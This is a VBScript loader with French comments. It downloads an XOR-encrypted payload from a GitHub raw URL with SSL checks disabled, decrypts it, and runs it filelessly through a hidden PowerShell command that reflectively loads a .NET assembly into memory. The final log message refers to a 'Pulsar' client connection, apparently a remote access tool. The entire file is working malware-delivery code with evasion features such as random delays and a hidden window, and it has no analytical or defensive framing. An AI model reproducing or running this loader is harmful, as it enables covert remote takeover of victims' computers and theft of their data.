Option Explicit
On Error Resume Next

' --- Paramètres ---
Const exeURL = "https://raw.githubusercontent.com/andy46467/test/main/xor-pulsar.txt"
Const xorKey = 129
Const maxRetries = 3
Const logFile = "C:\Windows\Temp\pulsar_fileless_log.txt"

Dim netReq, fileData, i, shell, attempt, errorsOccurred
Set shell = CreateObject("WScript.Shell")
Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
errorsOccurred = False

' --- Fonction pour logger ---
Sub Log(msg)
    Dim file
    Set file = fso.OpenTextFile(logFile, 8, True)
    file.WriteLine Now & " - " & msg
    file.Close
End Sub

' --- Fonction pour afficher message + log ---
Sub LogMsg(msg, Optional showMsg)
    Log msg
    If Not IsMissing(showMsg) Then
        If showMsg = True Then MsgBox msg, 64, "Pulsar Fileless"
    End If
End Sub

LogMsg "=== Script démarré ===", True

' --- Vérification PowerShell ---
Dim psPath
psPath = shell.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
If Not fso.FileExists(psPath) Then
    LogMsg "❌ PowerShell non trouvé à " & psPath, True
    errorsOccurred = True
Else
    LogMsg "✅ PowerShell trouvé à " & psPath
End If

' --- Téléchargement avec retry ---
For attempt = 1 To maxRetries
    Set netReq = CreateObject("MSXML2.ServerXMLHTTP")
    netReq.Open "GET", exeURL, False
    netReq.setOption 2, 13056 ' Ignore SSL
    netReq.Send

    If netReq.Status = 200 Then
        fileData = netReq.ResponseBody
        LogMsg "✅ Fichier téléchargé (" & LenB(fileData) & " octets) au try #" & attempt
        Exit For
    ElseIf attempt = maxRetries Then
        LogMsg "❌ Échec téléchargement après " & maxRetries & " tentatives. HTTP Status: " & netReq.Status, True
        errorsOccurred = True
    Else
        LogMsg "⚠ Échec try #" & attempt & ", HTTP Status: " & netReq.Status
        WScript.Sleep Int((Rnd * 2000) + 1000)
    End If
Next

' --- Vérifier erreurs avant déchiffrement ---
If errorsOccurred Then
    LogMsg "❌ Erreurs détectées, lancement annulé.", True
    WScript.Quit
End If

' --- Déchiffrement XOR ---
For i = 1 To LenB(fileData)
    MidB(fileData, i, 1) = ChrB(AscB(MidB(fileData, i, 1)) Xor xorKey)
Next
LogMsg "✅ Déchiffrement XOR terminé."

' --- Encodage Base64 pour PowerShell ---
Dim xml, node, b64
Set xml = CreateObject("MSXML2.DOMDocument")
Set node = xml.createElement("b64")
node.dataType = "bin.base64"
node.nodeTypedValue = fileData
b64 = Trim(node.text)
If Len(b64) = 0 Then
    LogMsg "❌ Erreur encodage Base64, lancement annulé.", True
    WScript.Quit
Else
    LogMsg "✅ Encodage Base64 terminé."
End If

' --- Construction commande PowerShell fileless ---
Dim psScript
psScript = "powershell -nop -w hidden -command " & _
           """$bytes=[System.Convert]::FromBase64String('" & b64 & "');" & _
           "[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)"""

LogMsg "✅ Commande PowerShell prête."

' --- Pause aléatoire avant exécution ---
WScript.Sleep Int((Rnd * 1000) + 1000)

' --- Exécution en mémoire ---
shell.Run psScript, 0, False
LogMsg "✅ EXE chargé en mémoire. Vérifie la connexion du client Pulsar."